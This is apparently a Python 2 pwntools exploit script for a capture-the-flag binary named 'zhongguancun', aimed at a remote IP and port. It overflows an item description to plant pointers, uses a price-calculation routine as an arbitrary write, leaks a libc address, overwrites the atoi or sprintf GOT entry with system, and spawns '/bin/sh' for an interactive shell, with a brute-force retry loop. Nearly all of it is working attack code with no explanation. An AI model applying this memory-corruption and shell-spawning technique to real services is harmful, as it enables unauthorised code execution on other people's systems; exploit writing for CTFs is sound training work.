from pwn import *

target = "./ld-linux.so.2 --library-path ./ ./zhongguancun"#"./zhongguancun"
target = ("218.2.197.235", 10273)
local = False
def get_io(target, local = True):
	#ELF("./zhongguancun")
	if local:
		io = process(target, shell = True, timeout = 9999)
	else:
		io = remote(target[0], target[1])
	return io

def register_store(io, name):
	print io.recvuntil("?")
	io.send_raw("a\n")
	print io.recvuntil("?")
	io.send_raw(name + "\n")

def sell_phone(io, name, os, price, description):
	print io.recvuntil("?")
	io.send_raw("a\n")
	print io.recvuntil("?")
	io.send_raw(name + "\n")
	print io.recvuntil("?")
	io.send_raw(str(os) + "\n")
	print io.recvuntil("?")
	io.send_raw(str(price) + "\n")
	print io.recvuntil("?")
	io.send_raw(description + "\n")

def sell_watch(io, name, type, price, description):
	print io.recvuntil("?")
	io.send_raw("b\n")
	print io.recvuntil("?")
	io.send_raw(name + "\n")
	print io.recvuntil("?")
	io.send_raw(str(type) + "\n")
	print io.recvuntil("?")
	io.send_raw(str(price) + "\n")
	print io.recvuntil("?")
	io.send_raw(description + "\n")

def generate_menu(io):
	print io.recvuntil("?")
	io.send_raw("c\n")

def ret_main_menu(io, cd_ch = "d"):
	print io.recvuntil("?")
	io.send_raw(cd_ch + "\n")

def try_my_store(io, index):
	print io.recvuntil("?")
	io.send_raw("b\n")
	print io.recvuntil("?")
	io.send_raw(str(index) + "\n")

def calc_addr(addr, paload_pos):
	addr -= paload_pos
	return addr


def get_wholesale_price(io, count, name_pos):

	print "------------------------fengexian------------------------"
	print io.recvuntil("Your choice?")
	io.send_raw("b\n")
	print io.recvuntil("How many do you plan to buy?")
	count = calc_addr(count, name_pos)
	print "addr to write is :", hex(count)
	print str(count)
	io.send_raw(str(count) + "\n")

	#print io.recvuntil("can offer is ")
	#data = io.recvuntil(" CNY")
	#print data
	#data = data[:-4]

	#print "------data in this time------"
	#print data
	#print "-----------------------------"

def buy_buy_buy(io, count):
	print io.recvuntil("?")
	io.send_raw("a\n")
	print io.recvuntil("?")
	io.send_raw(str(count) + "\n")

def leak_addr(io):
	register_store(io, "p"*63)

	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)

	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)

	#raw_input(":")
	generate_menu(io)#0x92e0788 0x8b4e788

	money_addr = 0x804b280

	addr = 0xf7449da0#int(raw_input(":"), 16)
	#addr = int(raw_input(":"), 16)
	#system_addr = p32(0xf74dc800)# + 0x0003ADA0 - 0x0003E800)
	system_addr = p32(addr)# + 0x0003E290 - 0x0003E800)


	atoi_got = p32(0x0804B038)

	menu_addr = 0x804b300

	type_addr = 0x0804B17C

	sub_804932e_addr = p32(0x08049B64)
	payload = (sub_804932e_addr + "v").rjust(79 - 4, "v")
	payload = atoi_got + payload

	sell_phone(io, "i" * 31, 4, -1000000000, payload)#0x92e12a8 0x8b4f2a8
	#over write
	generate_menu(io)
	ret_main_menu(io, "d")

	try_my_store(io, 16)
	#get_wholesale_price(io, 0x804b280, 0)
	get_wholesale_price(io, type_addr - len("Diamond Watch v price: -1000000000 CNY description: "), 0)
	get_wholesale_price(io, money_addr, 0)

	print io.recvuntil("Your choice?")
	io.send_raw("a\n")

	data = io.recvuntil("want to buy?")
	io.send_raw("1\n")
	io.recvuntil("Total money left: ")
	data = io.recvuntil(" CNY")
	print "data is :", data
	data = data[:-4]
	print data
	data = (int(data) - 1000000000)&0xffffffff
	print hex(data)
	system_addr = data + (0x0003ADA0 - 0x0002D160)
	print "system_addr :", hex(system_addr)
	return system_addr


def pwn(io, system_addr):
	register_store(io, "p"*63)

	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)

	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)

	#raw_input(":")
	generate_menu(io)#0x92e0788 0x8b4e788

	money_addr = p32(0x804b280)

	#addr = 0xf7449da0#int(raw_input(":"), 16)
	#addr = int(raw_input(":"), 16)
	#system_addr = p32(0xf74dc800)# + 0x0003ADA0 - 0x0003E800)
	system_addr = p32(system_addr)# + 0x0003E290 - 0x0003E800)

	atoi_got = 0x0804B038

	type_addr = 0x0804B17C

	sub_804932e_addr = p32(0x08049B64)
	payload = (sub_804932e_addr + "v").rjust(79 - 4, "v")
	payload = system_addr + payload

	sell_phone(io, "i" * 31, 4, -1000000000, payload)#0x92e12a8 0x8b4f2a8
	#over write
	generate_menu(io)
	ret_main_menu(io, "d")

	try_my_store(io, 16)
	#get_wholesale_price(io, 0x804b280, 0)
	get_wholesale_price(io, type_addr - len("Diamond Watch v price: -1000000000 CNY description: "), 0)
	get_wholesale_price(io, atoi_got, 0)

	io.recvuntil("?")
	io.send_raw("b\n")
	io.recvuntil("?")
	io.send_raw("sh\n")
	try:
		io.send("ls\n")
		data = io.recvuntil("\n")
		print "data is :", data
		if data.find("Segmentation") != -1 or data.find("core dump") != -1 or data.find("Hey diaosi") != -1 or data.find("a) Add item") != -1 or data.find("Are you kidding") != -1:
			return 
		else:
			io.interactive()
	except Exception, e:
		return
	else:
		pass
	finally:
		pass

def pwn2(io):
	register_store(io, "p"*63)

	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)

	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)
	sell_phone(io, "i" * 31, 4, -1000000000, "v" * 79)

	#raw_input(":")
	generate_menu(io)#0x92e0788 0x8b4e788

	money_addr = 0x804b280

	sprintf_addr = 0x0804b00c
	sprintf_addr = 0x0804b00b #shift one byte

	type_addr = 0x0804B17C
	sub_804932e_addr = p32(0x08049B64)
	payload = (sub_804932e_addr + "v").rjust(79 - 4, "v")
	payload = p32(sprintf_addr) + payload

	sell_phone(io, "i" * 31, 4, -1069811712, payload)#0x92e12a8 0x8b4f2a8
	#over write
	generate_menu(io)
	ret_main_menu(io, "d")

	try_my_store(io, 16)
	#get_wholesale_price(io, 0x804b280, 0)
	get_wholesale_price(io, type_addr - len("Diamond Watch v price: -1000000000 CNY description: "), 0)
	get_wholesale_price(io, money_addr, 0)


	sprintf_libc = 0x00049D80
	system_libc  = 0x0003ADA0

	diff = 61408#sprintf_libc - system

	io.recvuntil("?")
	io.send_raw("a\n")
	io.recvuntil("?")
	io.send_raw("4;/bin/sh\n")

	io.interactive()

try:
    from termcolor import colored
except:
    # if termcolor import failed, use the following v1.1.0 source code of termcolor here
    # since termcolor use MIT license, SATA license above should be OK
    ATTRIBUTES = dict( list(zip([ 'bold', 'dark', '', 'underline', 'blink', '', 'reverse', 'concealed' ], list(range(1, 9)))))
    del ATTRIBUTES['']
    HIGHLIGHTS = dict( list(zip([ 'on_grey', 'on_red', 'on_green', 'on_yellow', 'on_blue', 'on_magenta', 'on_cyan', 'on_white' ], list(range(40, 48)))))
    COLORS = dict(list(zip(['grey', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white', ], list(range(30, 38)))))
    RESET = '\033[0m'

    def colored(text, color=None, on_color=None, attrs=None):
        fmt_str = '\033[%dm%s'
        if color is not None: text = fmt_str % (COLORS[color], text)
        if on_color is not None: text = fmt_str % (HIGHLIGHTS[on_color], text)
        if attrs is not None:
            for attr in attrs:
                text = fmt_str % (ATTRIBUTES[attr], text)

        text += RESET
        return text
        
def pwn_carefully():
	print colored("pxx", "red")
	io = get_io(target, local = local)
	pwn2(io)


def pwn_violately():
	leak = True
	system_addr = 0x0
	while leak == True:
		io = get_io(target, local = local)
		system_addr = leak_addr(io)
		if system_addr > 0:
			leak = False
		io.kill()


	while True:
		try:
			io = get_io(target, local = local)
			pwn(io, system_addr)
		except Exception, e:
			pass
		else:
			pass
		finally:
			io.kill()

way = int(raw_input("pwn_violately(1) or pwn_carefully(2):"))
if way == 1:
	pwn_violately()
else:
	pwn_carefully()